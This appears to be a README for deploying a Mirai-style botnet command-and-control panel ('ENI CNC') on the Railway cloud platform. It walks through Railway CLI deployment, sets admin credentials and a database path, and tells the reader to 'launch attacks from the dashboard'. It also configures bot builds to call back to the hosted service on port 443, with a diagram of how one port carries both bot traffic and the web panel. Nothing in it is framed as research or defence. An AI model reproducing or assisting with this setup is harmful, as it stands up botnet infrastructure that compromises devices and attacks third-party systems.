# ENI CNC — Railway Deployment

## Quick Deploy (3 minutes)

### 1. Fork / Clone

Push this `railway/` directory to a GitHub repo, or deploy directly from the Railway dashboard.

### 2. Deploy on Railway

```bash
# install Railway CLI
npm i -g @railway/cli

# login
railway login

# create new project
railway init

# deploy from the railway/ directory
railway up
```

Or via the Railway dashboard:
1. New Project → Deploy from GitHub repo
2. Set root directory to `railway/`
3. Railway auto-detects the Dockerfile
4. Add a **volume** mounted at `/data` (for SQLite persistence)
5. Deploy

### 3. Configure

Environment variables (set in Railway dashboard):

| variable | default | notes |
|---|---|---|
| `PORT` | `8080` | auto-set by Railway |
| `ADMIN_USER` | `root` | change this |
| `ADMIN_PASS` | `mirai` | **definitely change this** |
| `DB_PATH` | `/data/mirai.db` | volume mount path |

### 4. Access

```
https://<your-service>.up.railway.app/
```

Login at the web panel, launch attacks from the dashboard.

### 5. Bot Connection

Bots connect to the **same URL and port** — the protocol detector auto-routes raw TCP bot traffic.

In `bot/build.sh`, set:
```bash
CNC_HOST="<your-service>.up.railway.app"
CNC_PORT=443   # Railway uses 443 externally, forwards to internal $PORT
```

Or for non-TLS bot connections, expose a TCP proxy port in Railway settings.

---

## Architecture (Railway Edition)

```
                    ┌─────────────────────────┐
                    │     Railway Service      │
                    │                         │
   HTTP ──────────►│  ┌───────────────────┐   │
  (web panel)      │  │  Protocol Detector │   │
                    │  │  (first 4KB peek)  │   │
   TCP ───────────►│  └──┬────────────┬───┘   │
  (bot traffic)     │     │            │       │
                    │     ▼            ▼       │
                    │  HTTP Handler  Bot Handler│
                    │  (Flask-like)  (raw TCP) │
                    │     │            │       │
                    │     └─────┬──────┘       │
                    │           ▼              │
                    │      SQLite DB           │
                    │    (/data/mirai.db)      │
                    └─────────────────────────┘
```

- **One port.** Protocol detection on the first bytes.
- **One service.** Web admin + bot listener unified.
- **Volume-backed DB.** Survives restarts and redeploys.
